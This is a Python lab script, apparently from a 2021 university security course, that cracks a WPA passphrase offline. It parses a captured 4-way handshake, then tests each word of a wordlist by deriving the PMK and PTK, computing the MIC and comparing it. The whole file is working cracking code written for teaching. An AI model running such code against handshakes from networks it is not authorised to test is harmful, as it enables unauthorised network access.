#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Utilise une liste de mots pour comparer les MIC et trouver la bonne passephrase


Remarque : Les variables ne sont pas mises dans le fichier custom pour cause de clareté
           et il nous semble évident qu'un des script peut évoluer et avoir besoin
           de définir des variables avec du contenu différent. Par conséquent il y a une petite 
           redondance entre eux en terme de contenu. (Par exemple en utilisant une autre trame)
           Cela nous permet d'avoir deux fichiers indépendants.
"""

__author__      = "Abraham Rubinstein et Yann Lederrey | modified By Schranz Guillaume et Lièvre Loïc"
__copyright__   = "Copyright 2021, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import custom 

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

#get packets from list
packetBroadcast = wpa[0] #beacon to find ssid
packetHS1 = wpa[5] #handshake 1
packetHS2 = wpa[6] #handshake 2
packetHS4 = wpa[8] #handshake 4

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = packetBroadcast.info.decode()
APmac       = a2b_hex(packetHS1.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1

# Authenticator and Supplicant Nonces
ANonce      = packetHS1.load[13:45] #on trouve le ANonce dans le handshake 1
SNonce      = Dot11Elt(packetHS2).load[65:97] #on trouve le snonce dans le handshake 2

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary

mic_to_test = Dot11Elt(packetHS4).load[129:-2].hex() #on trouve le mic dans le handshake 4

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

#on recupere la data dans le handshake 4 et on remplace le mic du payload par 0
data        = a2b_hex(Dot11Elt(packetHS4).load[48:].hex().replace(mic_to_test, "0"*len(mic_to_test))) #cf "Quelques détails importants" dans la donnée

ssid = str.encode(ssid)

#on ouvre le fichier de mots
fileWords = open("wordslist.txt", "r")

#on teste chaque mot du fichier
for word in fileWords.readlines():
    cleanWord = word.strip()#on nettoie le mot sinon \n fais encore partie du mot

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(cleanWord) 

    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = custom.customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    #on vérifie sir les deux mic sont egaux
    if mic.hexdigest()[:-8] == mic_to_test:
        print ("Correct passphrase : " + cleanWord)
        print ("\nResults of the key expansion")
        print ("=============================")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.hexdigest(),"\n")
        exit()
    else:
        print("Wrong passphrase : " + cleanWord)

#si on arrive ici c'est qu'aucune passphrase n'est correcte
print("No correct passphrases found")